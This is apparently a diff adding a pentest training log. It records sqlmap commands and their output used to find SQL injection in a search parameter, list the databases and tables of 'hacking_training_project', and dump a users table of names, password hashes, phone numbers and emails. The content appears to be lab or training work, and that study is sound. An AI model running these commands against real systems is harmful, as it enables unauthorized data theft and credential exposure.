@@ -1,0 +1,58 @@
+Command used -
+python sqlmap.py -r"search.txt"
+
+Output -
+Parameters: q (GET)
+    Type: boolean-based blind
+        : error-based
+        : time-based blind
+        : Union query
+
+
+
+Command used -
+python2 sqlmap.py -r"search.txt" --dbs
+
+Output -
+available databases [2]:[*] hacking_training_project
+                        [*] information_schema
+
+
+
+Command used -
+python2 sqlmap.py -r"search.txt" -D "hacking_training_project" --tables
+
+Output -
+Database: hacking_training_project
+        [10 tables]
+        +-----------------+
+        | brands          |
+        | cart_items      |
+        | categories      |
+        | customers       |
+        | order_items     |
+        | orders          |
+        | product_reviews |
+        | products        |
+        | sellers         |
+        | users           |
+        +-----------------+
+
+    
+
+Command used -
+python2 sqlmap.py -r"search.txt" -D "hacking_training_project" -T"users" -C"name,user_name,password,phone_number,email" --dump
+
+Output -
+Database: hacking_training_project
+Table: users
+    [15 entries]
+    +-----------------------+--------------------------+-------------+--------------+----------------------------+
+    | name                  | password                 | user_name   | phone_number | email                      |
+    +-----------------------+--------------------------+-------------+--------------+----------------------------+
+    | admin                 | $2y$10$xkmdvrxSCxqdyWSrD | admin       | 8521479630   | admin@lifestylestore.com   |
+    | Donald Duck           | $2y$10$PM.7nBSP5FMaldXiM | Donal234    | 9489625136   | donald@lifestylestore.com  |
+    | Brutus                | $2y$10$xkmdvrxSCxqdyWSrD | Pluto98     | 8912345670   | Pluto@lifestylestore.com   |
+    | Chandan               | $2y$10$4cZBEIrgthXdvT1hw | chandan     | 7854126395   | chandan@lifestylestore.com |
+    | acdc                  | $2y$10$J50B78.gpucuLTwpH | acdc        | 9999999999   | cewi@next-mail.info        |
+    +-----------------------+--------------------------+-------------+--------------+----------------------------+
